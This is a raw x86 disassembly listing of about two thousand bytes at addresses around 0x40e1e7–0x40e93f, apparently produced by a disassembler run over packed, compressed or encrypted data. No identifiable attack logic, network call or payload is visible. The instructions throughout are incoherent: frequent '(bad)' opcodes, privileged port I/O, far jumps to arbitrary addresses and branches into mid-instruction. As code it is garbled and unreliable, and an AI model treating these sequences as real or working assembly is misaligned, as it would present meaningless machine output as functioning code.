  40e1e7:	retf   0x8c13
  40e1ea:	gs popf 
  40e1ec:	xor    al,BYTE PTR [eax+esi*4]
  40e1ef:	imul   ecx,DWORD PTR [ecx+0x2b9954c2],0x52
  40e1f6:	jb     0x40e19a
  40e1f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1f9:	(bad)  
  40e1fa:	(bad)  
  40e1fb:	dec    esi
  40e1fc:	sar    ebx,cl
  40e1fe:	imul   ebp,DWORD PTR ds:0xe8d2cdb7,0xffffffbe
  40e205:	and    dl,BYTE PTR [ecx]
  40e207:	test   DWORD PTR [ebp-0x1d51cbcc],0x79a88660
  40e211:	mov    dh,0x8
  40e213:	cs test al,0xd
  40e216:	mov    ds:0x3f45e01e,al
  40e21b:	xchg   edi,eax
  40e21c:	popf   
  40e21d:	cwde   
  40e21e:	or     bh,BYTE PTR [edi+0x123cf77b]
  40e224:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e225:	xsha256 (bad)
  40e226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e227:	push   ecx
  40e228:	out    dx,eax
  40e229:	cmp    cl,cl
  40e22b:	sub    eax,0xacee835e
  40e230:	sbb    al,0x15
  40e232:	xchg   dl,bl
  40e234:	xchg   edx,eax
  40e235:	xchg   ecx,eax
  40e236:	ficomp DWORD PTR [ecx]
  40e238:	int3   
  40e239:	getsec 
  40e23b:	ss add dl,0xeb
  40e23f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e240:	mov    ds:0x1334e605,al
  40e245:	jbe    0x40e250
  40e247:	adc    eax,0x5386eb72
  40e24c:	cmc    
  40e24d:	xchg   esp,eax
  40e24e:	inc    ecx
  40e24f:	and    eax,0xebcec727
  40e254:	mov    al,ds:0x30ad81de
  40e259:	cwde   
  40e25a:	mov    es,ebp
  40e25c:	push   esp
  40e25d:	aas    
  40e25e:	rol    BYTE PTR [eax-0x3d],cl
  40e261:	xchg   ebx,eax
  40e262:	ja     0x40e2ca
  40e264:	mov    ecx,0x6b2112f7
  40e269:	outs   dx,DWORD PTR ds:[esi]
  40e26a:	out    0xda,eax
  40e26c:	outs   dx,DWORD PTR ds:[esi]
  40e26d:	ret    0xae29
  40e270:	jbe    0x40e23f
  40e272:	std    
  40e273:	mov    ecx,0x29c6be43
  40e278:	xor    al,0xbb
  40e27a:	jle    0x40e227
  40e27c:	xor    BYTE PTR [eax+ecx*8-0x2c],ch
  40e280:	ins    DWORD PTR es:[edi],dx
  40e281:	loope  0x40e277
  40e283:	or     al,0x65
  40e285:	mov    esi,0x468f2619
  40e28a:	push   0xffffff98
  40e28c:	fsub   QWORD PTR ds:0xa3e71ca7
  40e292:	int3   
  40e293:	ss mov ecx,0xdd8c90fe
  40e299:	stos   DWORD PTR es:[edi],eax
  40e29a:	loopne 0x40e26c
  40e29c:	sbb    ah,BYTE PTR [edi-0x35ba38c4]
  40e2a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2a3:	dec    edx
  40e2a4:	js     0x40e31a
  40e2a6:	enter  0x6fc3,0x5c
  40e2aa:	inc    eax
  40e2ab:	and    bl,BYTE PTR ds:0xde6093dd
  40e2b1:	jl     0x40e24a
  40e2b3:	sub    esp,DWORD PTR [ecx+0x68d66fbb]
  40e2b9:	shl    BYTE PTR cs:[eax],cl
  40e2bc:	sbb    esp,DWORD PTR [edx-0x24]
  40e2bf:	test   BYTE PTR ds:0x18dcc4ac,al
  40e2c5:	in     al,dx
  40e2c6:	lock mov dl,0x38
  40e2c9:	int3   
  40e2ca:	clc    
  40e2cb:	lods   al,BYTE PTR ds:[esi]
  40e2cc:	pop    es
  40e2cd:	cmp    BYTE PTR [ecx-0x4a],cl
  40e2d0:	cld    
  40e2d1:	jmp    0xb84bd283
  40e2d6:	mov    al,ds:0x47627272
  40e2db:	inc    edi
  40e2dc:	mov    eax,ds:0xd5cec5bc
  40e2e1:	jmp    0xf4d4:0x894bbe09
  40e2e8:	ja     0x40e296
  40e2ea:	sbb    BYTE PTR [bx-0x4453],0x33
  40e2f0:	jp     0x40e2c0
  40e2f2:	push   edx
  40e2f3:	lods   eax,DWORD PTR ds:[esi]
  40e2f4:	xor    cl,bl
  40e2f6:	cmp    esp,ebx
  40e2f8:	jge    0x40e30e
  40e2fa:	dec    edi
  40e2fb:	outs   dx,BYTE PTR ds:[esi]
  40e2fc:	xchg   esp,eax
  40e2fd:	and    dh,ch
  40e2ff:	and    al,0x8c
  40e301:	div    DWORD PTR [ebx-0x3cdb8251]
  40e307:	jnp    0x40e367
  40e309:	cmp    ah,0x7a
  40e30c:	mov    eax,ds:0x323f441d
  40e311:	add    BYTE PTR [esi],0xfd
  40e314:	cmp    al,0x10
  40e316:	pop    esi
  40e317:	xchg   esp,eax
  40e318:	cmp    eax,edx
  40e31a:	popa   
  40e31b:	int3   
  40e31c:	adc    cl,BYTE PTR [edx+edx*8]
  40e31f:	push   ss
  40e320:	sahf   
  40e321:	out    0x1a,al
  40e323:	out    dx,eax
  40e324:	test   DWORD PTR [edx-0x76a09209],edx
  40e32a:	dec    ecx
  40e32b:	dec    edx
  40e32c:	mov    al,ds:0xcbde8753
  40e331:	int3   
  40e332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e333:	das    
  40e334:	push   es
  40e335:	pop    ds
  40e336:	adc    al,0x31
  40e338:	pusha  
  40e339:	fnstcw WORD PTR [eax+0xe]
  40e33c:	sub    ecx,edi
  40e33e:	nop
  40e33f:	xor    al,0x3e
  40e341:	inc    ecx
  40e342:	cld    
  40e343:	iret   
  40e344:	rol    BYTE PTR [eax+0x44],0xd
  40e348:	fnclex 
  40e34a:	inc    eax
  40e34b:	neg    DWORD PTR [ecx-0x5]
  40e34e:	es pushf 
  40e350:	loopne 0x40e34f
  40e352:	fcomp  DWORD PTR [edi+ecx*2]
  40e355:	adc    eax,0x191c6aba
  40e35a:	sahf   
  40e35b:	xchg   DWORD PTR [edx-0x3d],ebx
  40e35e:	mov    esi,0x18f825f
  40e363:	leave  
  40e364:	stos   DWORD PTR es:[edi],eax
  40e365:	mov    edi,0x892716bf
  40e36a:	aas    
  40e36b:	loopne 0x40e3b3
  40e36d:	push   esi
  40e36e:	jb     0x40e3b5
  40e370:	es push esp
  40e372:	xchg   esi,eax
  40e373:	in     al,dx
  40e374:	xchg   esi,eax
  40e375:	inc    esp
  40e376:	(bad)  
  40e377:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40e379:	jmp    0x40e312
  40e37b:	jbe    0x40e3db
  40e37d:	fcmovnu st,st(2)
  40e37f:	jae    0x40e301
  40e381:	fist   DWORD PTR [edx-0x29a72c91]
  40e387:	cmp    eax,DWORD PTR [edx+0x16]
  40e38a:	fdiv   st(6),st
  40e38c:	out    dx,al
  40e38d:	add    bh,BYTE PTR [ebp+0x27466abe]
  40e393:	iret   
  40e394:	fcom   QWORD PTR [eax+0x4a2ed8d0]
  40e39a:	push   eax
  40e39b:	and    edx,DWORD PTR [ebp+0x7a]
  40e39e:	jl     0x40e3ac
  40e3a0:	aas    
  40e3a1:	pop    ebp
  40e3a2:	clc    
  40e3a3:	xchg   edi,eax
  40e3a4:	bound  ebp,QWORD PTR [ecx]
  40e3a6:	dec    edx
  40e3a7:	call   0xb11d0b0d
  40e3ac:	pop    eax
  40e3ad:	jmp    0xaa58:0x59facd1a
  40e3b4:	mov    al,ds:0x13bece8d
  40e3b9:	and    ebp,0xf8933e33
  40e3bf:	dec    ebx
  40e3c0:	das    
  40e3c1:	inc    ecx
  40e3c2:	xchg   edi,eax
  40e3c3:	jg     0x40e41d
  40e3c5:	and    ecx,DWORD PTR [edx+0x52]
  40e3c8:	das    
  40e3c9:	cld    
  40e3ca:	xor    BYTE PTR [edx-0x2a],al
  40e3cd:	push   eax
  40e3ce:	cmp    ch,cl
  40e3d0:	xlat   BYTE PTR ds:[ebx]
  40e3d1:	fcomip st,st(1)
  40e3d3:	fst    QWORD PTR [edx+0x62]
  40e3d6:	ret    0x40a1
  40e3d9:	xchg   ebx,eax
  40e3da:	fild   WORD PTR [ebx]
  40e3dc:	jle    0x40e3a6
  40e3de:	and    DWORD PTR [ebp-0x12e6ded1],edi
  40e3e4:	jb     0x40e3b3
  40e3e6:	sbb    BYTE PTR [edi],ah
  40e3e8:	call   0xe4eaacce
  40e3ed:	mov    ebx,0x4da4759e
  40e3f2:	sub    eax,0xc4733ca6
  40e3f7:	stos   DWORD PTR es:[edi],eax
  40e3f8:	call   0x48e0ea36
  40e3fd:	into   
  40e3fe:	jp     0x40e393
  40e400:	in     eax,dx
  40e401:	ss xchg ebx,eax
  40e403:	mov    ch,0xc3
  40e405:	jp     0x40e403
  40e407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e408:	xor    BYTE PTR [edi],dl
  40e40a:	mov    ecx,DWORD PTR [edi]
  40e40c:	adc    esi,ebp
  40e40e:	aam    0xbf
  40e410:	sub    DWORD PTR [ebp-0x56a946d9],0x982dad74
  40e41a:	push   es
  40e41b:	xchg   edx,eax
  40e41c:	jae    0x40e464
  40e41e:	lds    ebp,FWORD PTR [esi]
  40e420:	pop    esp
  40e421:	xor    DWORD PTR [esi-0x64],0xffffffa7
  40e425:	mov    eax,0x1aa38bf5
  40e42a:	xchg   esp,eax
  40e42b:	mov    esi,0x9fd8f1fd
  40e430:	daa    
  40e431:	sbb    eax,0x7d660306
  40e436:	jmp    0xf659:0xb6fcf522
  40e43d:	inc    esp
  40e43e:	add    eax,0x9b755943
  40e443:	repz ror BYTE PTR [ecx],0x1f
  40e447:	mov    al,ds:0xaa5f1ec7
  40e44c:	pop    ecx
  40e44d:	imul   edx,ebx,0x1a
  40e450:	lds    ebx,FWORD PTR [ebp+0xb75f554]
  40e456:	push   ds
  40e457:	popf   
  40e458:	cli    
  40e459:	addr16 data16 out dx,al
  40e45c:	xor    BYTE PTR [ebp+0x570aea31],al
  40e462:	jecxz  0x40e42e
  40e464:	call   0x2a20b39f
  40e469:	add    al,0x58
  40e46b:	mov    WORD PTR [edx],?
  40e46d:	sahf   
  40e46e:	pop    ds
  40e46f:	jmp    0x89c3:0x1f2ef7e3
  40e476:	or     al,0x8b
  40e478:	leave  
  40e479:	int    0x84
  40e47b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e47c:	pop    ebp
  40e47d:	pop    edx
  40e47e:	ins    BYTE PTR es:[edi],dx
  40e47f:	add    dl,BYTE PTR [ecx+0x4]
  40e482:	test   DWORD PTR [eax+ebx*2+0x715e4219],0xd0e4fdc0
  40e48d:	idiv   BYTE PTR [eax-0x62]
  40e490:	mov    ch,0x78
  40e492:	(bad)  
  40e494:	xchg   edi,eax
  40e495:	dec    ebp
  40e496:	clc    
  40e497:	sar    DWORD PTR [ecx],0x9
  40e49a:	dec    eax
  40e49b:	aam    0x3f
  40e49d:	test   DWORD PTR [esi+0x6de59bf],eax
  40e4a3:	(bad)  
  40e4a4:	pop    ds
  40e4a5:	xor    DWORD PTR ds:0x1f3358ed,edx
  40e4ab:	shl    BYTE PTR [eax],0xa8
  40e4ae:	mov    WORD PTR [edx+0x2c7b1e03],gs
  40e4b4:	lock outs dx,BYTE PTR ds:[esi]
  40e4b6:	jo     0x40e52d
  40e4b8:	ja     0x40e516
  40e4ba:	dec    ebp
  40e4bb:	(bad)  
  40e4bc:	cdq    
  40e4bd:	out    0x49,al
  40e4bf:	push   eax
  40e4c0:	mov    WORD PTR [ebp+0x5f137df0],?
  40e4c6:	aas    
  40e4c7:	into   
  40e4c8:	aam    0x44
  40e4ca:	jno    0x40e528
  40e4cc:	test   BYTE PTR [edi-0x77280e6d],ch
  40e4d2:	fistp  QWORD PTR [eax+0x6f]
  40e4d5:	cmp    al,0xaa
  40e4d7:	fld    TBYTE PTR [ebx+edx*1]
  40e4da:	lahf   
  40e4db:	mov    esi,ebp
  40e4dd:	(bad)  [eax+0x6a]
  40e4e0:	daa    
  40e4e1:	leave  
  40e4e2:	xchg   ebx,eax
  40e4e3:	test   BYTE PTR [ebp-0x2],0xa8
  40e4e7:	(bad)  
  40e4e9:	jg     0x40e4bf
  40e4eb:	mov    ah,0x8f
  40e4ed:	and    ebp,DWORD PTR [esp+ebx*2]
  40e4f0:	or     eax,0x19920cde
  40e4f5:	push   ecx
  40e4f6:	cmp    al,BYTE PTR [ecx-0x8]
  40e4f9:	inc    ecx
  40e4fa:	test   DWORD PTR [eax-0x581285fc],0xd1916e39
  40e504:	xor    al,0x52
  40e506:	sub    ebp,DWORD PTR [edi+0x1826e38c]
  40e50c:	jno    0x40e493
  40e50e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e50f:	push   esi
  40e510:	dec    ecx
  40e511:	rcr    DWORD PTR [edx],1
  40e513:	dec    ecx
  40e514:	add    ebx,ebx
  40e516:	test   al,0x13
  40e518:	add    BYTE PTR [ebp+edi*4-0x41],dl
  40e51c:	daa    
  40e51d:	cmp    DWORD PTR [esi+0x3b90c255],0xb85f4b81
  40e527:	xor    al,0x67
  40e529:	sbb    al,0x4b
  40e52b:	adc    edi,DWORD PTR [ecx+0x4011f89]
  40e531:	in     eax,dx
  40e532:	pop    ss
  40e533:	test   dl,bl
  40e535:	mov    bh,0x83
  40e537:	cld    
  40e538:	mov    edx,0x2bd4039f
  40e53d:	cs mov al,0xc6
  40e540:	mov    al,ds:0xd6a5678
  40e545:	mov    ah,0xd4
  40e547:	int3   
  40e548:	sbb    al,0xda
  40e54a:	pop    ds
  40e54b:	sbb    dh,BYTE PTR [edi+0x34]
  40e54e:	leave  
  40e54f:	push   esi
  40e550:	aad    0x8e
  40e552:	fs fcomi st,st(7)
  40e555:	pop    ebp
  40e556:	adc    eax,0xbba47ce6
  40e55b:	cdq    
  40e55c:	sbb    BYTE PTR [ebx+0x86047c7],ah
  40e562:	xchg   esp,eax
  40e563:	xor    BYTE PTR [ebx-0x420f0e07],0x1e
  40e56a:	in     al,0xfc
  40e56c:	or     esp,DWORD PTR [esi]
  40e56e:	cli    
  40e56f:	add    al,0xdf
  40e571:	cwde   
  40e572:	inc    esp
  40e573:	lods   al,BYTE PTR ds:[esi]
  40e574:	stc    
  40e575:	fbstp  TBYTE PTR [esi]
  40e577:	(bad)  
  40e578:	cli    
  40e579:	mov    edi,DWORD PTR [ecx+ecx*1+0x4255e012]
  40e580:	pop    eax
  40e581:	mov    ah,bl
  40e583:	mov    al,0x73
  40e585:	jmp    0x620ced53
  40e58a:	push   0xdc68441f
  40e58f:	jne    0x40e581
  40e591:	test   eax,0x7c9269d2
  40e596:	call   0x1eb:0x127d80b3
  40e59d:	cmc    
  40e59e:	dec    esi
  40e59f:	jg     0x40e5f0
  40e5a1:	prefetcht1 BYTE PTR [esi]
  40e5a4:	(bad)  
  40e5a5:	pop    ds
  40e5a6:	jmp    0x40e5bb
  40e5a8:	cmc    
  40e5a9:	int    0x46
  40e5ab:	fcmovnu st,st(5)
  40e5ad:	inc    eax
  40e5ae:	(bad)  
  40e5af:	xor    eax,0x236eef25
  40e5b4:	inc    edx
  40e5b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5b6:	ja     0x40e5ae
  40e5b8:	(bad)  
  40e5b9:	xor    BYTE PTR [edi-0x5b],dl
  40e5bc:	stos   BYTE PTR es:[edi],al
  40e5bd:	popf   
  40e5be:	and    eax,0xa7091bd
  40e5c3:	fs jle 0x527e2448
  40e5ca:	pop    ebx
  40e5cb:	inc    ecx
  40e5cc:	pop    ebx
  40e5cd:	out    0xd,al
  40e5cf:	std    
  40e5d0:	call   0xc79d:0x3253ec34
  40e5d7:	fwait
  40e5d8:	sar    DWORD PTR [edi-0xd8e835b],0x1b
  40e5df:	pop    ebx
  40e5e0:	nop
  40e5e1:	jmp    0x40e595
  40e5e3:	gs mov bh,0xb7
  40e5e6:	test   esp,esi
  40e5e8:	aaa    
  40e5e9:	rcr    BYTE PTR [ebx],0x8d
  40e5ec:	sahf   
  40e5ed:	sub    BYTE PTR [edx-0xb],ah
  40e5f0:	inc    esp
  40e5f1:	or     ebp,DWORD PTR [eax-0x18899aa8]
  40e5f7:	jno    0x142e1eb9
  40e5fd:	shl    BYTE PTR [eax+0x78],cl
  40e600:	inc    ebp
  40e601:	test   al,0xe9
  40e603:	(bad)  
  40e604:	pop    ebx
  40e605:	out    0x82,eax
  40e607:	dec    ecx
  40e608:	fwait
  40e609:	aaa    
  40e60a:	out    0xb5,al
  40e60c:	mov    al,0xd6
  40e60e:	and    DWORD PTR [ebx+0x4569d3bb],esp
  40e614:	fist   WORD PTR [ebx+edx*1]
  40e617:	in     eax,0xdf
  40e619:	icebp  
  40e61a:	in     eax,dx
  40e61b:	call   0xd5254e7c
  40e620:	out    0x35,al
  40e622:	pushf  
  40e623:	cdq    
  40e624:	call   0x677433a7
  40e629:	mov    bl,0x23
  40e62b:	fcom   DWORD PTR [ecx-0x6d]
  40e62e:	aaa    
  40e62f:	das    
  40e630:	lods   eax,DWORD PTR ds:[esi]
  40e631:	jmp    0x2f01:0x1b67dffd
  40e638:	adc    BYTE PTR [eax],0xac
  40e63b:	push   ss
  40e63c:	sahf   
  40e63d:	test   eax,0x26d6bef1
  40e642:	push   ebp
  40e643:	pushf  
  40e644:	mov    ebx,0x5124f21b
  40e649:	sbb    bl,bl
  40e64b:	outs   dx,BYTE PTR ds:[esi]
  40e64c:	rcl    DWORD PTR [ecx+0x67],cl
  40e64f:	xor    eax,0x18876246
  40e654:	dec    edi
  40e655:	xor    eax,0xe8f99b7e
  40e65a:	and    al,0x30
  40e65c:	jge    0x40e693
  40e65e:	adc    ah,BYTE PTR [eax]
  40e660:	aaa    
  40e661:	test   dh,0x8
  40e664:	scas   al,BYTE PTR es:[edi]
  40e665:	fcomp  QWORD PTR [eax+0x6517d695]
  40e66b:	outs   dx,BYTE PTR ds:[esi]
  40e66c:	lods   al,BYTE PTR ds:[esi]
  40e66d:	sub    edx,ebp
  40e66f:	cmc    
  40e670:	sbb    BYTE PTR [ebp+0x2],bl
  40e673:	(bad)  
  40e674:	and    al,0x25
  40e676:	or     DWORD PTR [eax+0x26],0x1273865f
  40e67d:	stos   DWORD PTR es:[edi],eax
  40e67e:	shr    esp,1
  40e680:	or     dh,al
  40e682:	pop    edi
  40e683:	enter  0x2721,0xeb
  40e687:	pop    es
  40e688:	lods   eax,DWORD PTR ds:[esi]
  40e689:	js     0x40e612
  40e68b:	repz sbb ebp,DWORD PTR [ebx-0x34]
  40e68f:	call   0xd15b:0x186ea77a
  40e696:	add    dl,dh
  40e698:	jle    0x40e68e
  40e69a:	and    al,BYTE PTR [esi+edx*2-0x28448a65]
  40e6a1:	pop    edi
  40e6a2:	retf   
  40e6a3:	xor    al,0x42
  40e6a5:	imul   ebx,DWORD PTR [ebp-0x47],0x1ece0a09
  40e6ac:	jns    0x40e63c
  40e6ae:	mov    esi,0xa4071262
  40e6b3:	ret    
  40e6b4:	pop    ss
  40e6b5:	dec    esp
  40e6b6:	mov    al,ds:0xbebcf4ff
  40e6bb:	mov    ds:0xb034367a,eax
  40e6c0:	dec    esp
  40e6c1:	inc    ebp
  40e6c2:	pop    ebp
  40e6c3:	xor    dl,dh
  40e6c5:	daa    
  40e6c6:	outs   dx,DWORD PTR ds:[esi]
  40e6c8:	and    al,0xbc
  40e6ca:	adc    al,0xf8
  40e6cc:	xlat   BYTE PTR ds:[ebx]
  40e6cd:	pop    ebp
  40e6ce:	xor    ebx,DWORD PTR [esi-0x1b]
  40e6d1:	(bad)  
  40e6d2:	call   0x4cceef36
  40e6d7:	aam    0xf1
  40e6d9:	mov    dh,0x7a
  40e6db:	bound  ebp,QWORD PTR [esp+ebp*1]
  40e6de:	call   FWORD PTR [edx-0x32]
  40e6e1:	test   BYTE PTR [edi+edi*2],bh
  40e6e4:	pop    esp
  40e6e5:	loop   0x40e6d2
  40e6e7:	shl    BYTE PTR [esi],cl
  40e6e9:	and    dl,BYTE PTR [ebp-0x1be64fe3]
  40e6ef:	dec    edi
  40e6f0:	dec    ebp
  40e6f1:	into   
  40e6f2:	inc    edx
  40e6f3:	inc    esp
  40e6f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6f5:	jne    0x40e6d2
  40e6f7:	xchg   esi,eax
  40e6f8:	inc    edx
  40e6f9:	xchg   edi,eax
  40e6fa:	and    DWORD PTR [esi+0x5cc27eef],esi
  40e700:	and    BYTE PTR [ecx+0x648f1e0f],al
  40e706:	xchg   ecx,eax
  40e707:	inc    esp
  40e708:	xlat   BYTE PTR ds:[ebx]
  40e709:	test   eax,0xd812117a
  40e70e:	inc    esp
  40e70f:	imul   edx,DWORD PTR [edx-0xa],0xffffffa0
  40e713:	sub    BYTE PTR [eax-0xe],cl
  40e716:	fbstp  TBYTE PTR [edx-0x27]
  40e719:	sub    BYTE PTR [ebx],ch
  40e71b:	mov    al,ds:0xd7d0b79d
  40e720:	sub    al,bh
  40e722:	dec    edi
  40e723:	xor    eax,0x9a9479c2
  40e728:	das    
  40e729:	xchg   DWORD PTR [ecx+0x4a],edi
  40e72c:	adc    DWORD PTR [edi-0xb430ce6],edx
  40e732:	mov    DWORD PTR [edx-0x6b978abf],esp
  40e738:	inc    esp
  40e739:	inc    esi
  40e73a:	in     eax,dx
  40e73b:	push   esp
  40e73c:	test   eax,0x23505556
  40e741:	into   
  40e742:	add    BYTE PTR es:[eax-0x3a2cfcd5],dl
  40e749:	stos   BYTE PTR es:[edi],al
  40e74a:	mov    edx,0x46c47f71
  40e74f:	pop    ebp
  40e750:	int    0xa7
  40e752:	or     eax,0x91e015b7
  40e757:	out    dx,al
  40e758:	and    al,0x8d
  40e75a:	and    BYTE PTR [esi-0x60],0x41
  40e75e:	pop    ebp
  40e75f:	mov    eax,ds:0x5b8beb9b
  40e764:	mov    DWORD PTR ds:0x2492a7c6,esp
  40e76a:	pop    edx
  40e76b:	mov    dl,0xec
  40e76d:	es adc ch,dh
  40e770:	stos   BYTE PTR es:[edi],al
  40e771:	in     al,0x7f
  40e773:	push   ebx
  40e774:	or     ecx,DWORD PTR [esp+ebp*4]
  40e777:	jle    0x40e79e
  40e779:	cmp    ecx,DWORD PTR [ebx-0x4948235]
  40e77f:	jmp    0x296bdc47
  40e784:	push   0x5b
  40e786:	jg     0x40e712
  40e788:	and    bh,ah
  40e78a:	jbe    0x40e773
  40e78c:	or     DWORD PTR [eax-0xf49f71],ebp
  40e792:	dec    edi
  40e793:	jp     0x40e720
  40e795:	jge    0x40e7e9
  40e797:	into   
  40e798:	and    BYTE PTR [ebp-0x6ea9790a],ch
  40e79e:	push   ss
  40e79f:	cmp    DWORD PTR [ebx],eax
  40e7a1:	mov    ecx,edx
  40e7a3:	pop    ds
  40e7a4:	(bad)  
  40e7a5:	jo     0x40e7c3
  40e7a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7a8:	nop
  40e7a9:	push   ss
  40e7aa:	daa    
  40e7ab:	sahf   
  40e7ac:	mov    esi,0x70a5c018
  40e7b1:	mov    ecx,0xc8918c2f
  40e7b6:	inc    eax
  40e7b7:	shr    ecx,1
  40e7b9:	mov    bh,0x85
  40e7bb:	pop    ebx
  40e7bc:	sub    eax,0xfd026603
  40e7c1:	or     dh,BYTE PTR [edi-0x12df9a83]
  40e7c7:	xchg   dh,ah
  40e7c9:	inc    esi
  40e7ca:	ja     0x40e7aa
  40e7cc:	pusha  
  40e7cd:	add    DWORD PTR [ecx+0x70],esi
  40e7d0:	jge    0x40e84c
  40e7d2:	fld    QWORD PTR [esi-0x2b28b444]
  40e7d8:	rol    BYTE PTR ds:0xb5ff78d1,1
  40e7de:	mov    ch,0x1f
  40e7e0:	pop    ecx
  40e7e1:	jae    0x40e825
  40e7e3:	arpl   di,dx
  40e7e5:	pop    esi
  40e7e6:	pop    ebx
  40e7e7:	outs   dx,BYTE PTR ds:[esi]
  40e7e8:	stos   BYTE PTR es:[edi],al
  40e7e9:	ins    BYTE PTR es:[edi],dx
  40e7ea:	sti    
  40e7eb:	fs push ebp
  40e7ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7ee:	sbb    bh,BYTE PTR [edx]
  40e7f0:	rcr    dl,0x70
  40e7f3:	into   
  40e7f4:	into   
  40e7f5:	mov    WORD PTR [eax],es
  40e7f7:	ficomp WORD PTR [ebx]
  40e7f9:	dec    edx
  40e7fa:	cmp    esi,DWORD PTR [edi-0xdb28d77]
  40e800:	jle    0x40e86c
  40e802:	shr    DWORD PTR [ebp-0x7f],0x43
  40e806:	dec    eax
  40e807:	mov    al,BYTE PTR [edi]
  40e809:	push   ds
  40e80a:	add    eax,0x7af996eb
  40e80f:	mov    al,0x14
  40e811:	adc    al,0xdd
  40e813:	pop    edi
  40e814:	and    al,BYTE PTR ds:0x99f8538f
  40e81a:	mov    ds:0xa347a309,eax
  40e81f:	cdq    
  40e820:	or     ecx,DWORD PTR [esi+ebx*2-0x30ebd57d]
  40e827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e828:	(bad)  
  40e829:	adc    ebx,DWORD PTR [edx-0x2acb4d75]
  40e82f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e830:	dec    ecx
  40e831:	ds lahf 
  40e833:	or     al,al
  40e835:	iret   
  40e836:	push   ss
  40e837:	push   ebx
  40e838:	arpl   WORD PTR [edx+ebx*8],cx
  40e83b:	aaa    
  40e83c:	push   0x9a61c1c2
  40e841:	outs   dx,DWORD PTR ds:[esi]
  40e842:	enter  0x15c5,0x25
  40e846:	mov    ch,ch
  40e848:	aas    
  40e849:	mov    ecx,0x79ae848f
  40e84e:	cwde   
  40e84f:	mov    ebx,0xf31b451c
  40e854:	ss push esp
  40e856:	jo     0x40e823
  40e858:	in     eax,0x2c
  40e85a:	loopne 0x40e84d
  40e85c:	nop
  40e85d:	(bad)  
  40e85f:	and    al,0x88
  40e861:	test   edx,esi
  40e863:	push   ecx
  40e864:	sbb    esi,DWORD PTR [edi]
  40e866:	inc    edx
  40e867:	popf   
  40e868:	sbb    sp,si
  40e86b:	xor    eax,0x919e7447
  40e870:	and    BYTE PTR [edx],ch
  40e872:	cmp    BYTE PTR cs:0x871745f9,cl
  40e879:	jne    0x40e8e2
  40e87b:	cld    
  40e87c:	ins    DWORD PTR es:[edi],dx
  40e87d:	or     BYTE PTR [bp+si],ch
  40e880:	xor    ebx,DWORD PTR [ecx-0x77565adf]
  40e886:	xchg   edx,eax
  40e887:	jae    0x40e8d8
  40e889:	in     eax,0xa
  40e88b:	cmp    BYTE PTR [edi],bh
  40e88d:	pushf  
  40e88e:	stos   DWORD PTR es:[edi],eax
  40e88f:	lahf   
  40e890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e891:	dec    edi
  40e892:	test   DWORD PTR [edx],esp
  40e894:	cmc    
  40e895:	xchg   BYTE PTR [ebp+0x45c65e97],bh
  40e89b:	imul   ecx,DWORD PTR [edx],0xffffffc5
  40e89e:	mov    edx,0x143a4c86
  40e8a3:	mov    edx,0x46f54d61
  40e8a8:	push   ebp
  40e8a9:	arpl   WORD PTR [eax],ax
  40e8ab:	mov    ebx,DWORD PTR [esi+0x2c525ec0]
  40e8b1:	push   edi
  40e8b2:	push   ecx
  40e8b3:	ss dec esp
  40e8b5:	sub    eax,ebp
  40e8b7:	mov    cl,0xc7
  40e8b9:	dec    edi
  40e8ba:	iret   
  40e8bb:	cli    
  40e8bc:	inc    edi
  40e8bd:	scas   eax,DWORD PTR es:[edi]
  40e8be:	mov    eax,0xe893b16a
  40e8c3:	in     eax,0x56
  40e8c5:	mov    ecx,0x61cd3002
  40e8ca:	jnp    0x40e87b
  40e8cc:	sub    eax,0xa62d3e0d
  40e8d1:	jmp    0x3278a828
  40e8d6:	xchg   ebp,eax
  40e8d7:	out    dx,eax
  40e8d8:	inc    ebx
  40e8d9:	aas    
  40e8da:	ret    0xc66b
  40e8dd:	pop    edx
  40e8de:	xchg   ecx,eax
  40e8df:	sub    al,0xb3
  40e8e1:	retf   0x406b
  40e8e4:	mov    dh,0x88
  40e8e6:	jbe    0x40e8a7
  40e8e8:	dec    DWORD PTR [esi+eax*8]
  40e8eb:	cmp    eax,ebx
  40e8ed:	or     DWORD PTR [eax-0x1d],0x42f348d3
  40e8f4:	outs   dx,BYTE PTR ds:[esi]
  40e8f5:	mov    bh,0x80
  40e8f7:	sub    al,0x61
  40e8f9:	push   es
  40e8fa:	dec    eax
  40e8fb:	dec    edi
  40e8fc:	pop    ebp
  40e8fd:	gs sbb bl,bh
  40e900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e901:	imul   edi,DWORD PTR ds:[edi-0x29f7ce5c],0xffffffde
  40e909:	ins    DWORD PTR es:[edi],dx
  40e90a:	jecxz  0x40e894
  40e90c:	cmc    
  40e90d:	sbb    bl,BYTE PTR fs:[ebx+0x6a]
  40e911:	call   0xc3b385b3
  40e916:	ja     0x40e929
  40e918:	pop    ebp
  40e919:	or     BYTE PTR [ebx-0x13cafec6],bl
  40e91f:	and    al,0x9
  40e921:	mov    edi,0xe7095fb0
  40e926:	bound  ecx,QWORD PTR [ebx+0x45]
  40e929:	mov    ch,0x8f
  40e92b:	jo     0x40e93a
  40e92d:	leave  
  40e92e:	sub    dl,ah
  40e930:	and    eax,edx
  40e932:	inc    esp
  40e933:	xor    al,0xad
  40e935:	mov    al,ds:0x5a3d217d
  40e93a:	ss or  al,0x2b
  40e93d:	stc    
  40e93e:	scas   al,BYTE PTR es:[edi]
  40e93f:	sub    DWORD PTR [esp+edi*4-0x63410b5d],edi
